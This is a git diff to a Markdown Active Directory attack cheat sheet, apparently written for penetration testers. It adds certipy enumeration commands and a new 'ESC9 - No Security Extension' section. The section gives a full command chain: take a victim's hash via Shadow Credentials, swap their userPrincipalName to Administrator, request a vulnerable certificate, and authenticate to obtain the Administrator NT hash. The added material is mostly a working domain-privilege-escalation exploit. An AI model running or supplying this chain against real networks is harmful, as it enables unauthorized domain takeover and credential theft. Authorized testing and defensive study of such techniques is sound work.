@@ -81,6 +81,7 @@
       - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
       - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
+      - [ESC9 - No Security Extension](#esc9---no-security-extension)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
     - [UnPAC The Hash](#unpac-the-hash)
@@ -257,6 +258,8 @@ Use the correct collector
 * Collect more data for certificates exploitation using Certipy
   ```ps1
   certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
   ```
 
 Then import the zip/json files into the Neo4J database and query them.
@@ -2458,6 +2461,45 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
   ```ps1
   certipy relay -ca 172.16.19.100
   ```
+
+
+#### ESC9 - No Security Extension
+
+Requirements:
+* `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
+* Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
+* Certificate specifies `Any Client` authentication EKU
+* `GenericWrite` over any account A to compromise any account B
+
+**Scenario**
+
+John@corp.local has **GenericWrite** over Jane@corp.local, and we want to compromise Administrator@corp.local. 
+Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value.
+
+* Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)
+    ```ps1
+    certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
+    ```
+* Change the **userPrincipalName** of Jane to be Administrator. :warning: leave the `@corp.local` part
+    ```ps1
+    certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
+    ```
+* Request the vulnerable certificate template ESC9 from Jane's account.
+    ```ps1
+    certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
+    # userPrincipalName in the certificate is Administrator 
+    # the issued certificate contains no "object SID"
+    ```
+* Restore userPrincipalName of Jane to Jane@corp.local.
+    ```ps1
+    certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
+    ```
+* Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. 
+    ```ps1
+    certipy auth -pfx administrator.pfx -domain corp.local
+    # Add -domain <domain> to your command line since there is no domain specified in the certificate.
+    ```
+
 
 #### Certifried CVE-2022-26923
 
